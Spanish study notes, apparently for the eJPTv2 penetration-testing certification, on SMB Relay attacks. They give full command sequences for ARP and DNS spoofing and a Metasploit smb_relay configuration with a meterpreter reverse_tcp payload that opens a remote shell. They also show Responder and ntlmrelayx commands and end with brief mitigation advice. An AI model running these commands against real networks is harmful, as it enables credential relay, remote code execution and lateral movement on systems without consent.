Un **SMB Relay** es un ataque de tipo **Man-in-the-Middle (MitM)**. El atacante intercepta una solicitud de autenticación SMB de una víctima y la **retransmite** hacia un servidor objetivo. Si la víctima tiene permisos en ese servidor, el atacante gana acceso sin conocer la contraseña.

- **Característica clave:** No se crackean hashes; se reutilizan credenciales en tránsito.
- **Resultado típico:** Ejecución remota de código (RCE) o sesión de Meterpreter.
## Objetivo del ataque

El objetivo es **ganar acceso no autorizado a un sistema objetivo** utilizando las credenciales de un usuario legítimo, permitiendo:

- Ejecución remota de código.
- Creación de usuarios administradores.
- Movimiento lateral en la red.
- Robo de información.

## ⚠️ Requisitos Críticos (Checklist)

Para que el ataque tenga éxito, se deben cumplir estas condiciones:

1. **SMB Signing Deshabilitado:** Es el requisito más importante. Si el servidor objetivo exige firma (Signing), rechazará la retransmisión.
2. **Privilegios de Administrador:** La víctima que interceptamos debe ser administrador local en el servidor objetivo para poder ejecutar payloads.
3. **Misma Red Local:** Necesitamos capacidad de interceptar tráfico (Capa 2).

> [!danger] **CRÍTICO:** Si SMB Signing está habilitado, el ataque falla.

## 🛠️ Metodología: Arpspoof + Dnsspoof + Metasploit
### Paso 0: Detección de SMB Signing con Nmap
Identificar qué equipos en la red permiten el ataque, utilizando el motor de scripts de Nmap (**NSE**) buscando específicamente el script `smb-security-mode`.
#### 1. Comando para una red completa
Ejecuta el siguiente comando reemplazando el rango por el de tu red (ej. `192.168.1.0/24`):
- `nmap -p 445 --script smb-security-mode <RANGO_IP>`

#### 2. Cómo interpretar los resultados

|**Resultado en Nmap**|**¿Es vulnerable a SMB Relay?**|
|---|---|
|`Message signing enabled and required`|**NO.** El servidor exige firma; el ataque fallará.|
|`Message signing enabled but not required`|**SÍ.** El servidor lo soporta pero no lo exige. Es vulnerable.|
|`Message signing disabled`|**SÍ.** Máxima vulnerabilidad.|
Ej:
```
Nmap scan report for 192.168.1.200
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (or "enabled but not required")
```

> [!important] Por defecto, las versiones de **Windows Server** suelen tener el firmado habilitado y requerido (no vulnerables), mientras que las versiones de **Windows Workstation** (Windows 7, 10, 11) suelen tenerlo deshabilitado o no requerido, lo que las convierte en los objetivos ideales para el `SMBHOST`

### Paso 1: Habilitar IP Forwarding
Para no interrumpir la conexión de la víctima y actuar como un puente invisible:
- `echo 1 > /proc/sys/net/ipv4/ip_forward`

### Paso 2: ARP Spoofing (Envenenamiento)
Necesitamos dos terminales para interceptar el tráfico bidireccional:

Terminal 1: Engañar a la víctima (decirle que eres el servidor)
- `arpspoof -i eth0 -t <IP_VICTIMA> <IP_SERVIDOR_REAL>`

Terminal 2: Engañar al servidor (decirle que eres la víctima)
- `arpspoof -i eth0 -t <IP_SERVIDOR_REAL> <IP_VICTIMA>`

> [!warning] Se necesitan estos DOS comandos para que el tráfico fluya en ambas direcciones

### Paso 3: DNSSpoof
Si la víctima intenta acceder a un recurso por nombre (ej: `\\fileserver`), la redirigimos a nuestra IP.
1. Crear archivo de suplantación DNS:
	- `echo "<IP_ATACANTE> <DOMINIO_A_SUPLANTAR>" > dns.txt`
	- Ejemplo: `echo "192.168.1.100 fileserver.local" > dns.txt`
2. Ejecutar dnsspoof:
	- `dnsspoof -i eth0 -f dns.txt`

### Paso 4: Configuración de Metasploit
Utilizaremos el módulo que gestiona la retransmisión y lanza el payload.
- **Módulo:** `exploit/windows/smb/smb_relay`

- `set SRVHOST <TU_IP>`
- `set LHOST <TU_IP>`
- `set SMBHOST <IP_OBJETIVO>` _IP del OBJETIVO (al que quieres acceder)_
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set LPORT <PUERTO>`
- `run o exploit`

| Opción      | Descripción                                               | Ejemplo                   |
| ----------- | --------------------------------------------------------- | ------------------------- |
| **SRVHOST** | IP donde el módulo escucha conexiones                     | Tu IP (192.168.1.100)     |
| **LHOST**   | IP para conexión de retorno del payload                   | Tu IP (192.168.1.100)     |
| **SMBHOST** | IP del servidor donde quieres entrar (DONDE retransmites) | 192.168.1.200             |
| **PAYLOAD** | Código a ejecutar si funciona                             | `meterpreter/reverse_tcp` |

### 📉 Flujo del Ataque

1. **Intercepción:** Gracias al ARP Spoofing, la víctima envía su tráfico SMB a tu máquina.
2. **Redirección:** Si usa nombres DNS, `dnsspoof` le da tu IP.
3. **Captura:** Metasploit recibe la petición de autenticación (el hash NTLM).
4. **Relay:** Metasploit reenvía esa autenticación al **SMBHOST** en tiempo real.
5. **Pwned:** El servidor acepta la conexión y Metasploit despliega el payload, devolviéndote una sesión.

### ¿Por qué este método funciona?

- **ARP Spoofing** asegura que el tráfico SMB pase por ti.
- **DNSSpoof** asegura que si la víctima usa nombres, también caiga en tu trampa.
- **Metasploit** hace el trabajo de "retransmisión" automáticamente.
- No necesitas crackear nada, solo "prestar" las credenciales.

## 🔍 Troubleshooting y Verificación
### Verificar IP forwarding
- `cat /proc/sys/net/ipv4/ip_forward`
- Debe ser 1

### Verificar tablas ARP envenenadas
- `arp -a`
- Verás entradas duplicadas o MACs extrañas

### Verificar que dnsspoof está funcionando
En la terminal de dnsspoof verás consultas DNS interceptadas

### Si Metasploit no recibe conexiones

- Comprobar que `SRVHOST` es correcto
- Verificar que no hay firewall bloqueando
- Asegurar que la víctima realmente intenta conectarse

## Limitaciones y consideraciones

- ❌ **No funciona** si SMB Signing está habilitado.
- ❌ **No funciona** contra sistemas parcheados con MS08-068 (reflexión).
- ✅ **Funciona mejor** en redes Windows antiguas o mal configuradas.
- ⚠️ **Ruidoso:** ARP spoofing puede ser detectado por IDS/IPS.

## Alternativa: Responder + ntlmrelayx.py 

> [!note] Esto NO entra en eJPTv2, pero es bueno saber que existe como alternativa más modular.

### Concepto básico
Terminal 1: Responder captura los hashes
- `responder -I eth0 -rdw`

Terminal 2: ntlmrelayx.py retransmite a objetivo
- `ntlmrelayx.py -t <IP_OBJETIVO> -smb2support`

### Diferencia con Metasploit

|Metasploit (eJPTv2)|Responder + ntlmrelayx|
|---|---|
|Todo en uno|Herramientas separadas|
|Automático|Más control manual|
|Menos visible en logs?|Más configurable|

## 🛡️ Mitigación (Defensa)

- **Habilitar SMB Signing:** La medida más efectiva (obligatoria en Domain Controllers).
- **Segmentación de Red:** Evita que atacantes en la misma VLAN realicen ARP Spoofing.
- **Deshabilitar protocolos antiguos:** Como LLMNR y NetBIOS.


---
**Navegación:**
- Volver a: [[4.2 Ataques Basados en Red]]
- [[Técnicas]]